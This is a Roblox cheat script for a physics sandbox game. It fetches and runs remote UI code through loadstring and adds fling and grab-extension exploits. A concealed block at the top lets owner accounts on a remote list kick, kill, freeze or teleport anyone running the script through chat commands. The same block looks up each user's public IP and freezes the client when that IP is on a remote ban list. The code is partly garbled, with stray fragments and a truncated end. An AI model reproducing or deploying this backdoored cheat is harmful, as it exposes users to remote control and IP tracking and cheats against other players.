 
        





do
local ID_LIST_URL = "https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/L"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function ConvertToRawUrl(url)
    if type(url) == "string" and url:find("github.com") then
        url = url:gsub("github.com", "raw.githubusercontent.com"):gsub("/blob/", "/")
    end
    return url
end

local function SafeFetch(url)
    url = ConvertToRawUrl(url)
    local success, res = pcall(function()
        return game:HttpGet(url)
    end)
    if success and type(res) == "string" and #res > 0 then
        return res
    end
    return nil
end

local rawData = SafeFetch(ID_LIST_URL)
if not rawData then
    error("[SEC_ERR_01] Execution terminated.", 2)
    return
end

local parseSuccess, parsedList = pcall(function()
    return HttpService:JSONDecode(rawData)
end)

if not parseSuccess or type(parsedList) ~= "table" then
    error("[SEC_ERR_02] Execution terminated.", 2)
    return
end

local CheckIsOwner = (function()
    local internalTable = {}
    for _, id in ipairs(parsedList) do
        local n = tonumber(id)
        if n then
            internalTable[n] = true
        end
    end
    table.freeze(internalTable)
    parsedList = nil
    rawData = nil

    return function(targetId)
        if type(targetId) ~= "number" then return false end
        return internalTable[targetId] == true
    end
end)()

local isLocalOwner = CheckIsOwner(LocalPlayer.UserId)
if isLocalOwner then
    print("[ADMIN SYSTEM] Auth Rank: OWNER (" .. tostring(LocalPlayer.Name) .. ")")
else
    print("[ADMIN SYSTEM] Auth Rank: USER (" .. tostring(LocalPlayer.Name) .. ")")
end

task.spawn(function()
    local checkFunc = CheckIsOwner
    while task.wait(2) do
        if debug.info(checkFunc, "s") ~= debug.info(CheckIsOwner, "s") or typeof(CheckIsOwner) ~= "function" then
            warn("[Security Alert] Script tampering detected.")


            break
        end
    end
end)

local function GetPlayerByPrefix(name)
    if type(name) ~= "string" or #name == 0 then return nil end
    name = name:lower()
    for _, player in ipairs(Players:GetPlayers()) do
        local pName = player.Name:lower()
        local pDisp = player.DisplayName:lower()
        if pName:sub(1, #name) == name or pDisp:sub(1, #name) == name then
            return player
        end
    end
    return nil
end

local function ProcessCommand(sender, message)
    if not sender or type(message) ~= "string" or #message < 2 then return end
    
    if not CheckIsOwner(sender.UserId) then return end
    if message:sub(1, 1) ~= ";" then return end

    local args = string.split(message:sub(2), " ")
    local cmd = args[1] and args[1]:lower()
    local targetName = args[2]

    if not cmd or not targetName then return end

    local targetPlayer = GetPlayerByPrefix(targetName)

    if targetPlayer and targetPlayer == LocalPlayer then
        if cmd == "킥" or cmd == "kick" then
            LocalPlayer:Kick("\n[Admin System]\nOwner(" .. tostring(sender.Name) .. ")was forcibly ejected by [onwer].")
            
        elseif cmd == "킬" or cmd == "kill" then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Health = 0
            end
            
        elseif cmd == "브링" or cmd == "bring" then
            local senderChar = sender.Character
            local myChar = LocalPlayer.Character
            local senderRoot = senderChar and senderChar:FindFirstChild("HumanoidRootPart")
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if senderRoot and myRoot then
                myRoot.CFrame = senderRoot.CFrame * CFrame.new(0, 0, -3)
            end
            
        elseif cmd == "얼리기" or cmd == "freeze" then
            local myChar = LocalPlayer.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if myRoot then
                myRoot.Anchored = true
            end
            
        elseif cmd == "녹이기" or cmd == "unfreeze" then
            local myChar = LocalPlayer.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if myRoot then
                myRoot.Anchored = false
            end
            
        elseif cmd == "리스폰" or cmd == "reset" then
            local myChar = LocalPlayer.Character
            if myChar then
                myChar:BreakJoints()
            end
        end
    end
end

local function ConnectPlayer(player)
    if not player then return end
    player.Chatted:Connect(function(msg)
        pcall(function()
            ProcessCommand(player, msg)
        end)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    ConnectPlayer(player)
end

Players.PlayerAdded:Connect(ConnectPlayer)
local TARGET_LIST_URL = "https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/BL"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local function ConvertToRawUrl(url)
    if type(url) == "string" and url:find("github.com") then
        url = url:gsub("github.com", "raw.githubusercontent.com"):gsub("/blob/", "/")
    end
    return url
end
local function SafeFetch(url)
    url = ConvertToRawUrl(url)
    local success, res = pcall(function()
        return game:HttpGet(url)
    end)
    if success and type(res) == "string" and #res > 0 then
        return res
    end
    return nil
end
local function FetchExternalIP()
    local success, res = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if success and type(res) == "string" and #res > 0 then
        return res:match("^%s*(.-)%s*$")
    end
    local success2, res2 = pcall(function()
        return game:HttpGet("https://icanhazip.com")
    end)
    if success2 and type(res2) == "string" and #res2 > 0 then
        return res2:match("^%s*(.-)%s*$")
    end
    return nil
end
local rawData = SafeFetch(TARGET_LIST_URL)
if not rawData then
    warn("Access was blocked due to a failed block list loading.")
    task.wait(0.1)
    while true do end
end
local parseSuccess, parsedList = pcall(function()
    return HttpService:JSONDecode(rawData)
end)
if not parseSuccess or type(parsedList) ~= "table" then
    warn("Access was blocked due to a block list format error.")
    task.wait(0.1)
    while true do end
end
local CheckIsBlockedIP = (function()
    local internalTable = {}
    for _, ip in ipairs(parsedList) do
        if type(ip) == "string" then
            internalTable[ip] = true
        end
    end
    table.freeze(internalTable)
    parsedList = nil
    rawData = nil
    return function(targetIp)
        if type(targetIp) ~= "string" then return false end
        return internalTable[targetIp] == true
    end
end)()
local clientIP = FetchExternalIP()
if not clientIP then
    warn("The network verification failed and access was blocked.")
    task.wait(0.1)
    while true do end
end
if CheckIsBlockedIP(clientIP) then
    warn("ban IP ")
    task.wait(0.1)
    while true do end
end
task.spawn(function()
    local checkFunc = CheckIsBlockedIP
    while task.wait(1) do
        local currentIP = FetchExternalIP()
        if not currentIP or CheckIsBlockedIP(currentIP) or debug.info(checkFunc, "s") ~= debug.info(CheckIsBlockedIP, "s") or typeof(CheckIsBlockedIP) ~= "function" then
            warn("Script tampering or bypass attempts were detected.")
            task.wait(0.1)
            while true do end
            break
        end
    end
end)

end
do
if game.PlaceId ~= 6961824067 then
    warn("It is a game that is not supported.")
    return
end


end
--loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

local Options = Library.Options
local Toggles = Library.Toggles

Library.ForceCheckbox =  flase 


local OrionLib = {
	Themes = {},
	Flags = {},
	ThemeObjects = {},
}

do
	setmetatable(OrionLib.Flags, {
		__index = function(t, k)
			local flag = {
				Set = function() end,
				SetValue = function() end,
				Get = function() return nil end,
			}
			rawset(t, k, flag)
			return flag
		end,
	})

	local function PlaySound(id)
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://" .. id
	sound.Volume = 6
	sound.Parent = game:GetService("SoundService")
	sound:Play()

	game:GetService("Debris"):AddItem(sound, 3)
end

local function safeNotify(title, content, time)
	pcall(function()
		Library:Notify({
			Title = tostring(title or "Notification"),
			Description = tostring(content or ""),
			Time = tonumber(time) or 5,
		})

		
		PlaySound(139452805868562)
	end)
end

function OrionLib:MakeNotification(info)
	safeNotify(
		info and (info.Name or info.Title),
		info and (info.Content or info.Description),
		info and info.Time
	)
end
	local function getGroup(tabProxy)
		if tabProxy._currentGroup then
			return tabProxy._currentGroup
		end
		
		local side = tabProxy._side or 1
		local groupName = (tabProxy._name or "Tab") .. " Main"
		local grp = (side == 1) and tabProxy._tab:AddLeftGroupbox(groupName) or tabProxy._tab:AddRightGroupbox(groupName)
		tabProxy._side = (side == 1) and 2 or 1
		tabProxy._currentGroup = grp
		return grp
	end

	local function makeLabelProxy(lbl)
		return {
			Set = function(_, v)
				pcall(function() lbl:SetText(tostring(v)) end)
			end,
			SetText = function(_, v)
				pcall(function() lbl:SetText(tostring(v)) end)
			end,
		}
	end

	local function makeToggleProxy(t)
		local proxy = {
			_obj = t,
			Set = function(_, v) pcall(function() t:SetValue(v) end) end,
			SetValue = function(_, v) pcall(function() t:SetValue(v) end) end,
			Get = function() return t.Value end,
		}
		setmetatable(proxy, {
			__index = function(_, k)
				return t[k]
			end,
			__newindex = function(_, k, v)
				t[k] = v
			end,
		})
		return proxy
	end

	local function makeDropdownProxy(d)
		if type(d) ~= "table" then
			return d
		end
		d.Set = function(_, v)
			pcall(function() d:SetValue(v) end)
		end
		d.SetValue = function(_, v)
			pcall(function() d:SetValue(v) end)
		end
		d.Get = function()
			return d.Value
		end
		d.Refresh = function(_, values, keep)
			pcall(function() d:SetValues(values or {}) end)
			if not keep then
				pcall(function() d:SetValue(nil) end)
			end
		end
		return d
	end

	local function ensureFlagObject(flagName, obj)
		if type(flagName) == "string" and flagName ~= "" and obj ~= nil then
			OrionLib.Flags[flagName] = obj
		end
	end

	local function makeNoopSectionProxy()
		local noop = {}
		setmetatable(noop, {
			__index = function(_, k)
				if type(k) == "string" and k:sub(1, 3) == "Add" then
					return function() return noop end
				end
				return nil
			end,
		})
		return noop
	end

	local function makeSectionProxy(tabProxy, grp)
		local section = {}

		function section:AddToggle(ti)
			local t = grp:AddToggle(ti.Name or "Toggle", {
				Text = ti.Name or "Toggle",
				Default = ti.Default == true,
				Callback = ti.Callback,
			})
			local proxy = makeToggleProxy(t)
			ensureFlagObject(ti and ti.Flag, proxy)
			return proxy
		end

		function section:AddButton(ti)
			grp:AddButton(ti.Name or "Button", {
				Text = ti.Name or "Button",
				Func = ti.Callback or ti.Func,
			})
		end

		function section:AddDropdown(ti)
			local multi = (ti and ((ti.MultipleSelection == true) or (ti.Multi == true)))
			local d = grp:AddDropdown(ti.Name or "Dropdown", {
				Text = ti.Name or "Dropdown",
				Values = ti.Options or {},
				Default = ti.Default,
				Multi = multi,
				Callback = ti.Callback,
			})
			d = makeDropdownProxy(d)
			ensureFlagObject(ti and ti.Flag, d)
			return d
		end

		function section:AddTeamsDropdown(ti)
			local multi = (ti and ((ti.MultipleSelection == true) or (ti.Multi == true)))
			local d = grp:AddDropdown(ti.Name or "Teams", {
				Text = ti.Name or "Teams",
				SpecialType = "Team",
				Multi = multi,
				Default = ti and ti.Default or nil,
				Callback = function(val)
					if not ti or not ti.Callback then return end
					if multi and type(val) == "table" then
						local out = {}
						for name, enabled in pairs(val) do
							if enabled then
								table.insert(out, name)
							end
						end
						ti.Callback(out)
					else
						ti.Callback(val)
					end
				end,
			})
			d = makeDropdownProxy(d)
			ensureFlagObject(ti and ti.Flag, d)
			return d
		end

		function section:AddColorpicker(ti)
			local name = (ti and ti.Name) or "Color"
			local flag = ti and ti.Flag
			local default = (ti and ti.Default) or Color3.new(1, 1, 1)

						local host = grp:AddToggle("__cp_" .. tostring(name), {
				Text = tostring(name),
				Default = false,
				Callback = function() end,
			})
			local cp = host:AddColorPicker("__cp_val_" .. tostring(flag or name), {
				Title = tostring(name),
				Default = default,
				Callback = function(c)
					if ti and ti.Callback then
						ti.Callback(c)
					end
				end,
			})
			ensureFlagObject(flag, cp)
			return cp
		end
		section.AddColorPicker = section.AddColorpicker

		function section:AddSubSection(ti)
			return tabProxy:AddSection(ti)
		end

		function section:AddPlayersDropdown(ti)
			local multi = (ti and ((ti.MultipleSelection == true) or (ti.Multi == true)))
			local d = grp:AddDropdown(ti.Name or "Players", {
				Text = ti.Name or "Players",
				SpecialType = "Player",
				ExcludeLocalPlayer = ti and (ti.ExcludeLocalPlayer == true or ti.RemoveDP == true),
				Multi = multi,
				Default = ti and ti.Default or nil,
				Callback = function(val)
					if not ti or not ti.Callback then return end
					if multi and type(val) == "table" then
						local out = {}
						for name, enabled in pairs(val) do
							if enabled then
								table.insert(out, name)
							end
						end
						ti.Callback(out)
					else
						ti.Callback(val)
					end
				end,
			})
			d = makeDropdownProxy(d)
			ensureFlagObject(ti and ti.Flag, d)
			return d
		end

		function section:AddSlider(ti)
			local s = grp:AddSlider(ti.Name or "Slider", {
				Text = ti.Name or "Slider",
				Min = tonumber(ti.Min) or 0,
				Max = tonumber(ti.Max) or 100,
				Default = tonumber(ti.Default) or tonumber(ti.Min) or 0,
				Rounding = 0,
				Callback = ti.Callback,
			})
			pcall(function()
				if type(s) == "table" and s.Set == nil and s.SetValue ~= nil then
					s.Set = function(_, v) s:SetValue(v) end
				end
			end)
			ensureFlagObject(ti and ti.Flag, s)
			return s
		end

		function section:AddTextbox(ti)
			local i = grp:AddInput(ti.Name or "Textbox", {
				Text = ti.Name or "Textbox",
				Default = tostring(ti.Default or ""),
				Numeric = false,
				Finished = true,
				Callback = ti.Callback,
			})
			pcall(function()
				if type(i) == "table" and i.Set == nil and i.SetValue ~= nil then
					i.Set = function(_, v) i:SetValue(v) end
				end
			end)
			ensureFlagObject(ti and ti.Flag, i)
			return i
		end

		function section:AddLabel(text)
			local lbl = grp:AddLabel(tostring(text or ""))
			return makeLabelProxy(lbl)
		end

		function section:AddBind(ti)
			local kp = grp:AddKeyPicker(ti.Name or "Bind", {
				Text = ti.Name or "Bind",
				Default = ti.Default,
				Mode = ti.Hold and "Hold" or "Toggle",
				Callback = ti.Callback,
			})
			pcall(function()
				if type(kp) == "table" and kp.Set == nil and kp.SetValue ~= nil then
					kp.Set = function(_, v) kp:SetValue(v) end
				end
			end)
			ensureFlagObject(ti and ti.Flag, kp)
			return kp
		end

		function section:AddSection(ti)
			return tabProxy:AddSection(ti)
		end

		function section:AddParagraph(ti)
			local title = (ti and ti.Name) or (ti and ti.Title) or ""
			local content = (ti and ti.Content) or (ti and ti.Description) or ""
			if title ~= "" then
				grp:AddLabel(tostring(title))
			end
			if content ~= "" then
				grp:AddLabel(tostring(content))
			end
			return {}
		end

		return section
	end

	function OrionLib:MakeWindow(info)
		local obsidianWindow = Library:CreateWindow({
			Title = tostring(info and info.Name or "Window"),
			Footer = tostring(info and info.IntroText or ""),
			NotifySide = "Right",
			ShowCustomCursor = true,
		})

		local windowProxy = {}
		function windowProxy:MakeTab(tabInfo)
			local tabName = tostring(tabInfo and tabInfo.Name or "Tab")
			local obsidianTab = obsidianWindow:AddTab(tabName, "box")
			local tabProxy = {
				_tab = obsidianTab,
				_name = tabName,
				_side = 1,
				_currentGroup = nil,
			}
			setmetatable(tabProxy, {
				__index = function(t, k)
					if type(k) == "string" and k:sub(1, 3) == "Add" then
						return function() return makeNoopSectionProxy() end
					end
					return rawget(t, k)
				end,
			})

			function tabProxy:AddToggle(ti)
				local grp = getGroup(tabProxy)
				local t = grp:AddToggle(ti.Name or "Toggle", {
					Text = ti.Name or "Toggle",
					Default = ti.Default == true,
					Callback = ti.Callback,
				})
				local proxy = makeToggleProxy(t)
				ensureFlagObject(ti and ti.Flag, proxy)
				return proxy
			end

			function tabProxy:AddButton(ti)
				local grp = getGroup(tabProxy)
				grp:AddButton(ti.Name or "Button", {
					Text = ti.Name or "Button",
					Func = ti.Callback or ti.Func,
				})
			end

			function tabProxy:AddDropdown(ti)
				local grp = getGroup(tabProxy)
				local multi = (ti and ((ti.MultipleSelection == true) or (ti.Multi == true)))
				local d = grp:AddDropdown(ti.Name or "Dropdown", {
					Text = ti.Name or "Dropdown",
					Values = ti.Options or {},
					Default = ti.Default,
					Multi = multi,
					Callback = ti.Callback,
				})
				d = makeDropdownProxy(d)
				ensureFlagObject(ti and ti.Flag, d)
				return d
			end

			function tabProxy:AddTeamsDropdown(ti)
				local grp = getGroup(tabProxy)
				local multi = (ti and ((ti.MultipleSelection == true) or (ti.Multi == true)))
				local d = grp:AddDropdown(ti.Name or "Teams", {
					Text = ti.Name or "Teams",
					SpecialType = "Team",
					Multi = multi,
					Default = ti and ti.Default or nil,
					Callback = function(val)
						if not ti or not ti.Callback then return end
						if multi and type(val) == "table" then
							local out = {}
							for name, enabled in pairs(val) do
								if enabled then
									table.insert(out, name)
								end
							end
							ti.Callback(out)
						else
							ti.Callback(val)
						end
					end,
				})
				d = makeDropdownProxy(d)
				ensureFlagObject(ti and ti.Flag, d)
				return d
			end

			function tabProxy:AddColorpicker(ti)
				local grp = getGroup(tabProxy)
				return makeSectionProxy(tabProxy, grp):AddColorpicker(ti)
			end
			tabProxy.AddColorPicker = tabProxy.AddColorpicker

			function tabProxy:AddSubSection(ti)
				return tabProxy:AddSection(ti)
			end

			function tabProxy:AddPlayersDropdown(ti)
				local grp = getGroup(tabProxy)
				local multi = (ti and ((ti.MultipleSelection == true) or (ti.Multi == true)))
				local d = grp:AddDropdown(ti.Name or "Players", {
					Text = ti.Name or "Players",
					SpecialType = "Player",
					ExcludeLocalPlayer = ti and (ti.ExcludeLocalPlayer == true or ti.RemoveDP == true),
					Multi = multi,
					Default = ti and ti.Default or nil,
					Callback = function(val)
						if not ti or not ti.Callback then return end
						if multi and type(val) == "table" then
							local out = {}
							for name, enabled in pairs(val) do
								if enabled then
									table.insert(out, name)
								end
							end
							ti.Callback(out)
						else
							ti.Callback(val)
						end
					end,
				})
				d = makeDropdownProxy(d)
				ensureFlagObject(ti and ti.Flag, d)
				return d
			end

			function tabProxy:AddSlider(ti)
				local grp = getGroup(tabProxy)
				local s = grp:AddSlider(ti.Name or "Slider", {
					Text = ti.Name or "Slider",
					Min = tonumber(ti.Min) or 0,
					Max = tonumber(ti.Max) or 100,
					Default = tonumber(ti.Default) or tonumber(ti.Min) or 0,
					Rounding = 0,
					Callback = ti.Callback,
				})
				pcall(function()
					if type(s) == "table" and s.Set == nil and s.SetValue ~= nil then
						s.Set = function(_, v) s:SetValue(v) end
					end
				end)
				ensureFlagObject(ti and ti.Flag, s)
				return s
			end

			function tabProxy:AddTextbox(ti)
				local grp = getGroup(tabProxy)
				local i = grp:AddInput(ti.Name or "Textbox", {
					Text = ti.Name or "Textbox",
					Default = tostring(ti.Default or ""),
					Numeric = false,
					Finished = true,
					Callback = ti.Callback,
				})
				pcall(function()
					if type(i) == "table" and i.Set == nil and i.SetValue ~= nil then
						i.Set = function(_, v) i:SetValue(v) end
					end
				end)
				ensureFlagObject(ti and ti.Flag, i)
				return i
			end

			function tabProxy:AddLabel(text)
				local grp = getGroup(tabProxy)
				local lbl = grp:AddLabel(tostring(text or ""))
				return makeLabelProxy(lbl)
			end

			
			function tabProxy:AddSection(ti)
				local side = tabProxy._side or 1
				local name = (typeof(ti) == "table" and ti.Name) or tostring(ti or "")
				if not name or name == "" then
					name = (tabProxy._name or "Tab") .. " Section"
				end
				local grp = (side == 1) and tabProxy._tab:AddLeftGroupbox(name) or tabProxy._tab:AddRightGroupbox(name)
				tabProxy._side = (side == 1) and 2 or 1
				tabProxy._currentGroup = grp
				return makeSectionProxy(tabProxy, grp)
			end

			function tabProxy:AddParagraph(ti)
				local grp = getGroup(tabProxy)
				local title = (ti and ti.Name) or (ti and ti.Title) or ""
				local content = (ti and ti.Content) or (ti and ti.Description) or ""
				if title ~= "" then
					grp:AddLabel(tostring(title))
				end
				if content ~= "" then
					grp:AddLabel(tostring(content))
				end
				return {}
			end

			return tabProxy
		end

		return windowProxy
	end
end

function PcldOwner()
    task.spawn(function()
        while task.wait(0.1) do
            usedNames = {}

            for _, pcld in pairs(workspace:GetChildren()) do
                if pcld.Name == "PlayerCharacterLocationDetector" then
                    if pcld.CFrame == CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1) then
                        continue
                    end

                    hasOwner = false
                    existingBoolValues = {}

                    for _, child in pairs(pcld:GetChildren()) do
                        if child:IsA("BoolValue") then
                            table.insert(existingBoolValues, child)
                        end
                    end

                    if #existingBoolValues >= 2 then
                        for _, boolValue in pairs(existingBoolValues) do
                            boolValue:Destroy()
                        end
                    elseif #existingBoolValues == 1 then
                        hasOwner = true
                    end

                    if hasOwner then
                        continue
                    end

                    closestPlayer = nil
                    closestDist = 30
                    candidates = {}

                    for _, player in pairs(Players:GetPlayers()) do
                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                            hrp = player.Character.HumanoidRootPart
                            dist = (pcld.Position - hrp.Position).Magnitude

                            if dist < closestDist then
                                table.insert(candidates, {
                                    player = player,
                                    dist = dist,
                                    hrp = hrp
                                })
                            end
                        end
                    end

                    table.sort(candidates, function(a, b)
                        return a.dist < b.dist
                    end)

                    for _, candidate in pairs(candidates) do
                        ownerName = string.format("[ %s ] ( @%s )",
                            candidate.player.DisplayName,
                            candidate.player.Name)

                        if not usedNames[ownerName] then
                            closestPlayer = candidate.player
                            closestDist = candidate.dist
                            usedNames[ownerName] = true
                            break
                        end
                    end

                    if closestPlayer then
                        ownerName = string.format("[ %s ] ( @%s )",
                            closestPlayer.DisplayName,
                            closestPlayer.Name)

                         boolValue = nil
                        for _, child in pairs(pcld:GetChildren()) do
                            if child:IsA("BoolValue") then
                                boolValue = child
                                boolValue.Name = ownerName
                                break
                            end
                        end

                        if not boolValue then
                            boolValue = Instance.new("BoolValue")
                            boolValue.Name = ownerName
                            boolValue.Parent = pcld
                        end

                        task.spawn(function(player, value)
                            while value.Parent do
                                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                     hrp = player.Character.HumanoidRootPart
                                    
                                    if hrp.Massless == true then
                                        if not value.Value then
                                            value.Value = true
                                        end
                                    else
                                        if value.Value then
                                            value.Value = false
                                        end
                                    end

                                    if not Players:FindFirstChild(player.Name) or 
                                       not player.Character or 
                                       player.Character:FindFirstChild("Humanoid") and 
                                       player.Character.Humanoid.Health <= 0 then
                                        value:Destroy()
                                        break
                                    end
                                else
                                    value:Destroy()
                                    break
                                end

                                task.wait(0.1)
                            end
                        end, closestPlayer, boolValue)
                    end
                end
            end
        end
    end)
end


function SpawnCFrame()
    local camPart
    myDisplayName = plr.DisplayName
    myUserName = plr.Name
    myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)

    function findMyPO()
        for _, obj in pairs(workspace:GetChildren()) do
            if obj.Name == "PlayerCharacterLocationDetector" then
                for _, child in pairs(obj:GetChildren()) do
                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
                        return obj
                    end
                end
            end
        end
        return nil
    end

    if not workspace:FindFirstChild("CamPart") or workspace:FindFirstChild("CamPart"):FindFirstChild("CamPart") then
         char = plr.Character or plr.CharacterAdded:Wait()
        camPart = char:FindFirstChild("CamPart"):Clone()
        camPart.Name = "CamPart"
        camPart.Parent = workspace
        camPart.Transparency = 0.9
    else
        camPart = workspace.CamPart
    end

     lastHRPVelocity = Vector3.new(0, 0, 0)

    task.spawn(function()
         rayParams = RaycastParams.new()
        rayParams.FilterType = Enum.RaycastFilterType.Exclude

        while true do
             ping = plr:GetNetworkPing()
             myPO = findMyPO()
             char = plr.Character
             hrp = char and char:FindFirstChild("HumanoidRootPart")

            if hrp then
                lastHRPVelocity = hrp.Velocity
            end

            if myPO and hrp then
                rayParams.FilterDescendantsInstances = {char, camPart, myPO}

                 offset = myPO.Position + (lastHRPVelocity * (ping + 0.15))

                 rayOrigin = offset
                 rayDirection = Vector3.new(0, 23, 0)
                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                 originalRotation = myPO.CFrame.Rotation * CFrame.Angles(math.rad(-90), 0, 0)
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation

                rayParams.FilterDescendantsInstances = {char, camPart}

                 offset = hrp.Position + (lastHRPVelocity * (ping + 0.15))
                
                 rayOrigin = offset
                 rayDirection = Vector3.new(0, 20, 0)
                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)

                local targetPosition

                if rayResult then
                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
                else
                    targetPosition = offset + rayDirection
                end

                 originalRotation = (hrp.CFrame * CFrame.Angles(math.rad(-90), 0, 0)).Rotation
                camPart.CFrame = CFrame.new(targetPosition) * originalRotation
                camPart.Name = "SpawnCF"
            end
            task.wait()
        end
    end)

    return camPart
end
end

local FILE = "FTAP_Config.json"

getgenv().IsLoadingConfig = false

local function SaveAll()
    local saveTable = {}

    for flag, obj in pairs(OrionLib.Flags or {}) do
        if obj and obj.Value ~= nil then
            saveTable[flag] = obj.Value
        end
    end

    local success, err = pcall(function()
        writefile(FILE, HttpService:JSONEncode(saveTable))
    end)

    if success then
        print("[Config] Storage complete")
    else
        warn("[Config] Storage failure:", err)
    end
end

local function LoadAll()
    if not isfile(FILE) then
        warn("[Config] There are no saved files.")
        return
    end

    local success, data = pcall(function()
        return HttpService:JSONDecode(readfile(FILE))
    end)

    if not (success and type(data) == "table") then
        warn("[Config] Failure to import (possibility of file damage)")
        return
    end

    getgenv().IsLoadingConfig = true

    local loaded = 0
    for flag, value in pairs(data) do
        local obj = OrionLib.Flags and OrionLib.Flags[flag]
        if obj then
            local ok = pcall(function()
                if typeof(obj.Set) == "function" then
                    
                    obj:Set(value)
                elseif typeof(obj.SetState) == "function" then
                    obj:SetState(value)
                else
                    obj.Value = value
                    if typeof(obj.Callback) == "function" then
                        task.spawn(obj.Callback, value)
                    end
                end
            end)
            if ok then
                loaded = loaded + 1
            end
        end
    end

    getgenv().IsLoadingConfig = false
    print("[Config] Import complete | Flag number:", loaded)
end

function House()
    char = plr.Character
    if not char then
        Plot = nil
        return
    end

    if char.Parent and char.Parent.Name == "PlayersInPlots" then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
        return
    end

    if char.Parent == workspace or char.Parent == inv then
        for _, plot in workspace.Plots:GetChildren() do
            for _, owner in plot.PlotSign.ThisPlotsOwners:GetChildren() do
                if owner.Value == plr.Name then
                    if plot.Name == "Plot1" then
                        Plot = 1
                    elseif plot.Name == "Plot2" then
                        Plot = 2
                    elseif plot.Name == "Plot3" then
                        Plot = 3
                    elseif plot.Name == "Plot4" then
                        Plot = 4
                    elseif plot.Name == "Plot5" then
                        Plot = 5
                    end
                    return
                end
            end
        end
        Plot = nil
    else
        Plot = nil
    end
end

function UpdateCurrentBlobman()
	char = plr.Character
	hrp = char and char:FindFirstChild("HumanoidRootPart")
	if not hrp then return end

	for _, blobs in workspace:GetDescendants() do
		if blobs.Name ~= "CreatureBlobman" then continue end
		 seat = blobs:FindFirstChild("VehicleSeat")
		if not seat then continue end
		 weld = seat:FindFirstChild("SeatWeld")
		if not weld then continue end
		if weld.Part1 == hrp then
			currentBlobS = blobs
		end
	end
end

function flingF()
    workspace.ChildAdded:Connect(function(model)
        if model.Name == "GrabParts" then
             part_to_impulse = model["GrabPart"]["WeldConstraint"].Part1
            if part_to_impulse then
                model:GetPropertyChangedSignal("Parent"):Connect(function()
                    if not model.Parent and flingT then
                        local connection
                        connection = uis.InputBegan:Connect(function(inp, char)
                            if inp.UserInputType == Enum.UserInputType.MouseButton2 then
                                 velocityObj = Instance.new("BodyVelocity")
                                velocityObj.Parent = part_to_impulse
                                velocityObj.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                velocityObj.Velocity = cam.CFrame.lookVector * strengthV
                                
                                wait(0.1)
                                velocityObj.Parent = workspace
                                velocityObj:Destroy()

                                connection:Disconnect()
                            end
                        end)
                    end
                end)
            end
        end
    end)
end

function infLineExtendF()
    uis.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseWheel then
            if lineDistanceV < 11 then
                lineDistanceV = 11
            end
    
            if input.Position.Z > 0 then
                lineDistanceV = lineDistanceV + increaseLineExtendV
            elseif input.Position.Z < 0 then
                lineDistanceV = lineDistanceV - increaseLineExtendV
            end
        end
    end)
    
    workspace.ChildAdded:Connect(function(child)
        if child.Name == "GrabParts" and child:IsA("Model") then
            if infLineExtendT and uis.MouseEnabled then
                 grabPartsModel = child

                grabPartsModel:WaitForChild("GrabPart")
                grabPartsModel:WaitForChild("DragPart")
                    
                 clonedDragPart = grabPartsModel.DragPart:Clone()
                clonedDragPart.Name = "DragPart1"
                clonedDragPart.AlignPosition.Attachment1 = clonedDragPart.DragAttach
                clonedDragPart.Parent = grabPartsModel
                
                lineDistanceV = (clonedDragPart.Position - cam.CFrame.Position).Magnitude
    
                clonedDragPart.AlignOrientation.Enabled = false
                grabPartsModel.DragPart.AlignPosition.Enabled = false

                if MasslessGrabT then
                     alignOrientation = clonedDragPart:FindFirstChildOfClass("AlignOrientation")
                    if alignOrientation then
                        alignOrientation.MaxAngularVelocity = math.huge
                        alignOrientation.MaxTorque = math.huge
                        alignOrientation.Responsiveness = 200
                    end
                    
                     alignPosition = clonedDragPart:FindFirstChildOfClass("AlignPosition")
                    if alignPosition then
                        alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
                        alignPosition.MaxForce = math.huge
                        alignPosition.MaxVelocity = math.huge
                        alignPosition.Responsiveness = 200
                    end
                end
    
                task.spawn(function()
                    while grabPartsModel.Parent do
                        clonedDragPart.Position = cam.CFrame.Position + cam.CFrame.LookVector * lineDistanceV
                        task.wait()
                    end
            
                    lineDistanceV = 0
                end)
            end
        end
    end)
end

		BlobMassless(currentBlobS, player.Character.HumanoidRootPart, "Right")
        end
    end
end

    end

function updateJumpPowerF()
    local function apply(char)
